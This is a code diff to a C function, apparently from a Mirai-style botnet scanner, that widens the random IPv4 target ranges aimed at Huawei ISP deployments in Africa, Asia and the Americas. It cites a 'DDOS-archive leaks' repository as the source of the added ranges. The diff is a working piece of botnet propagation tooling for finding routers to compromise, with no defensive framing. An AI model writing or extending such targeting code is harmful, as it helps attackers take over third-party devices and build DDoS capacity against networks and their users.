@@ -136,19 +136,23 @@ static ipv4_t get_random_ip_huawei(void) {
         addr = rand_next();
 
         /* Target Huawei ISP deployments - Global coverage
+         * Combined: Existing ranges + IllusionSec DDOS-archive leaks
          * Major ISPs: MTN, Etisalat, STC, Airtel, Viettel, Claro, Movistar
          * Regions: Africa, Middle East, Asia, Latin America, Europe
+         * Source: github.com/illusionsec/DDOS-archive/tree/main/leaks
          */
         uint8_t first_octet = (addr >> 24) & 0xFF;
 
-        /* Africa - Major Huawei deployment */
+        /* Africa - Major Huawei deployment (from leaks) */
         if (first_octet == 197 || first_octet == 196 || first_octet == 195 ||
             first_octet == 194 || first_octet == 193 || first_octet == 192 ||
             first_octet == 165 || first_octet == 164 || first_octet == 163 ||
             first_octet == 162 || first_octet == 161 || first_octet == 160 ||
             first_octet == 159 || first_octet == 158 || first_octet == 157 ||
             first_octet == 156 || first_octet == 155 || first_octet == 154 ||
-            first_octet == 153 || first_octet == 41) {
+            first_octet == 153 || first_octet == 152 || first_octet == 151 ||
+            first_octet == 150 || first_octet == 149 || first_octet == 105 ||
+            first_octet == 102 || first_octet == 41) {
             break;
         }
 
@@ -164,24 +168,27 @@ static ipv4_t get_random_ip_huawei(void) {
         }
 
         /* Asia - Huawei deployments */
-        if (first_octet == 125 || first_octet == 124 || first_octet == 123 ||
-            first_octet == 122 || first_octet == 121 || first_octet == 120 ||
-            first_octet == 119 || first_octet == 118 || first_octet == 117 ||
-            first_octet == 116 || first_octet == 115 || first_octet == 114 ||
-            first_octet == 113 || first_octet == 112 || first_octet == 111 ||
-            first_octet == 110 || first_octet == 109 || first_octet == 108 ||
-            first_octet == 107 || first_octet == 106 || first_octet == 105 ||
-            first_octet == 104 || first_octet == 103 || first_octet == 102 ||
-            first_octet == 101 || first_octet == 63 || first_octet == 62 ||
-            first_octet == 61 || first_octet == 60 || first_octet == 59 ||
-            first_octet == 58 || first_octet == 57 || first_octet == 56 ||
-            first_octet == 55 || first_octet == 54 || first_octet == 53 ||
-            first_octet == 52 || first_octet == 51 || first_octet == 50 ||
-            first_octet == 45 || first_octet == 44 || first_octet == 43 ||
-            first_octet == 42 || first_octet == 40 || first_octet == 39 ||
-            first_octet == 38 || first_octet == 37 || first_octet == 36 ||
-            first_octet == 27 || first_octet == 14 || first_octet == 2 ||
-            first_octet == 1) {
+        if (first_octet == 223 || first_octet == 222 || first_octet == 221 ||
+            first_octet == 220 || first_octet == 219 || first_octet == 218 ||
+            first_octet == 211 || first_octet == 210 || first_octet == 203 ||
+            first_octet == 202 || first_octet == 125 || first_octet == 124 ||
+            first_octet == 123 || first_octet == 122 || first_octet == 121 ||
+            first_octet == 120 || first_octet == 119 || first_octet == 118 ||
+            first_octet == 117 || first_octet == 116 || first_octet == 115 ||
+            first_octet == 114 || first_octet == 113 || first_octet == 112 ||
+            first_octet == 111 || first_octet == 110 || first_octet == 109 ||
+            first_octet == 108 || first_octet == 107 || first_octet == 106 ||
+            first_octet == 104 || first_octet == 103 || first_octet == 101 ||
+            first_octet == 63 || first_octet == 62 || first_octet == 61 ||
+            first_octet == 60 || first_octet == 59 || first_octet == 58 ||
+            first_octet == 57 || first_octet == 56 || first_octet == 55 ||
+            first_octet == 54 || first_octet == 53 || first_octet == 52 ||
+            first_octet == 51 || first_octet == 50 || first_octet == 45 ||
+            first_octet == 44 || first_octet == 43 || first_octet == 42 ||
+            first_octet == 40 || first_octet == 39 || first_octet == 38 ||
+            first_octet == 37 || first_octet == 36 || first_octet == 31 ||
+            first_octet == 27 || first_octet == 14 || first_octet == 5 ||
+            first_octet == 4 || first_octet == 2 || first_octet == 1) {
             break;
         }
 
@@ -198,14 +205,8 @@ static ipv4_t get_random_ip_huawei(void) {
             first_octet == 76 || first_octet == 75 || first_octet == 74 ||
             first_octet == 73 || first_octet == 72 || first_octet == 71 ||
             first_octet == 70 || first_octet == 69 || first_octet == 68 ||
-            first_octet == 67 || first_octet == 66 || first_octet == 65) {
-            break;
-        }
-
-        /* Asia-Pacific (Australia, Pacific) */
-        if (first_octet == 203 || first_octet == 202 || first_octet == 210 ||
-            first_octet == 211 || first_octet == 218 || first_octet == 219 ||
-            first_octet == 220) {
+            first_octet == 67 || first_octet == 66 || first_octet == 65 ||
+            first_octet == 64) {
             break;
         }
     }
